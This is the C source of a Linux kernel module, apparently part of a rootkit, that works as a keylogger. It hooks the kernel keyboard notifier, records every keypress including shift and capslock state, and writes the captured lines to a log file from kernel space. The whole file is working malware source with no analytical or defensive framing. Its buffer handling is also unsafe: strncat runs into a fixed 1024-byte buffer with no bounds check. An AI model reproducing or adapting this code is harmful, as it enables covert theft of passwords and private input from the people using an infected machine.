#include "keylogger.h"

static struct workqueue_struct *queue;

static struct semaphore sem;
static int capslock = 0;
static int shift = 0;

typedef struct
{
	struct work_struct rk_work;
	char *data;
	int size;
} rk_work_t;

rk_work_t *work_keylogger, *work_start;

static struct file *filep;

static char buffer[1024];

static void rk_work_func(struct work_struct *work)
{
	int rk;
	rk_work_t *rk_work = (rk_work_t *)work;
	rk = kernel_write(filep, rk_work->data, rk_work->size, 0);
	// pr_info("KERN_WRITE: %d", rk);
	kfree((void *)rk_work->data);
	kfree((void *)work);
}

static int keylogger_notify(struct notifier_block *nb, unsigned long action, void *void_params)
{
	struct keyboard_notifier_param *param = void_params;
	if (action == KBD_KEYCODE)
	{
		if (param->value == 42 || param->value == 54)
		{
			down(&sem);
			shift = param->down ? 1 : 0;
			up(&sem);
			return NOTIFY_OK;
		}
		if (param->down)
		{
			if (param->value == 58) // Capslock
			{
				capslock = !capslock;
			}
			if (param->value == 28) // Enter
			{
				strncat(buffer, "\n", 1);
				// Write buffer out to file
				if (queue)
				{
					work_keylogger = (rk_work_t *)kmalloc(sizeof(rk_work_t), GFP_KERNEL);
					if (work_keylogger)
					{
						INIT_WORK((struct work_struct *)work_keylogger, rk_work_func);
						work_keylogger->size = strlen(buffer);
						work_keylogger->data = kmalloc(strlen(buffer) + 1, GFP_KERNEL);
						strncpy(work_keylogger->data, buffer, strlen(buffer));
						work_keylogger->data[strlen(buffer)] = '\0';
						queue_work(queue, (struct work_struct *)work_keylogger);
					}
				}
				memset(buffer, '\0', sizeof(buffer));
			}
			else
			{
				down(&sem);
				if (shift)
					strncat(buffer, keymap_shift[param->value], strlen(keymap_shift[param->value]));
				else if (capslock)
					strncat(buffer, keymap_capslock[param->value], strlen(keymap_capslock[param->value]));
				else
					strncat(buffer, keymap[param->value], strlen(keymap[param->value]));
				up(&sem);
			}
		}
	}
	return NOTIFY_OK;
}

static struct notifier_block keylogger_notifier = {
	.notifier_call = keylogger_notify};

int keylogger_init(void)
{
	pr_info("Init keylogger");

	queue = create_workqueue("queue");

	if (!(filep = filp_open(KEYLOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0)))
	{
		return -1;
	}

	work_start = (rk_work_t *)kmalloc(sizeof(rk_work_t), GFP_KERNEL);
	if (work_start)
	{
		char log_message[] = "Starting keylogger\n";
		INIT_WORK((struct work_struct *)work_start, rk_work_func);
		work_start->size = strlen(log_message);
		work_start->data = kmalloc(strlen(log_message) + 1, GFP_KERNEL);
		strncpy(work_start->data, log_message, strlen(log_message));
		work_start->data[strlen(log_message)] = '\0';
		queue_work(queue, (struct work_struct *)work_start);
	}

	register_keyboard_notifier(&keylogger_notifier);
	sema_init(&sem, 1);

	return 0;
}

int keylogger_clean(void)
{
	// cancel_work_sync((struct work_struct *)work_start);
	// cancel_work_sync((struct work_struct *)work_keylogger);
	flush_workqueue(queue);
	destroy_workqueue(queue);
	unregister_keyboard_notifier(&keylogger_notifier);
	filp_close(filep, NULL);
	return 0;
}
